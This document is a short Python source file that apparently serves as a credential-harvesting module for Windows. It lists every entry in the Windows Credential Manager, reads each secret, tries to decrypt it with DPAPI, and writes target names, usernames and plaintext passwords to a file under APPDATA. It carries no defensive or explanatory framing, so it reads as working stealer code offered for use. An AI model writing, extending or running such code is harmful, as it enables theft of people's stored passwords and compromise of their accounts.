import win32cred
import os
import ctypes
from ctypes import wintypes

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", wintypes.LPBYTE)]

crypt32 = ctypes.windll.crypt32

def decrypt_password(encrypted_password):
    try:
        data_blob = DATA_BLOB(len(encrypted_password), encrypted_password)
        decrypted_data = DATA_BLOB()
        if crypt32.CryptUnprotectData(ctypes.byref(data_blob), None, None, None, None, 0, ctypes.byref(decrypted_data)):
            decrypted_password = ctypes.create_string_buffer(decrypted_data.pbData, decrypted_data.cbData)
            return decrypted_password.value.decode('utf-8', errors='ignore')
        return ""
    except Exception:
        return ""

def credmgr():
    try:
        creds = win32cred.CredEnumerate(None, 0)
        result = ""
        for cred in creds:
            try:
                target = cred['TargetName']
                username = cred['UserName']
                cred_detail = win32cred.CredRead(target, cred['Type'], 0)
                encrypted_password = cred_detail['CredentialBlob']
                password = decrypt_password(encrypted_password) if encrypted_password else "N/A"
                result += f"Target: {target}\nUsername: {username}\nPassword: {password}\n"
                result += "----------------------------------------------------\n"
            except Exception as e:
                continue
        save_path = os.path.join(os.getenv('APPDATA'), 'vault', 'credentials')
        os.makedirs(save_path, exist_ok=True)
        file_path = os.path.join(save_path, 'creds.txt')
        with open(file_path, 'w') as file:
            file.write(result)
        return f"Credentials saved to {file_path}"
    except Exception as e:
        return f"Error retrieving credentials: {str(e)}"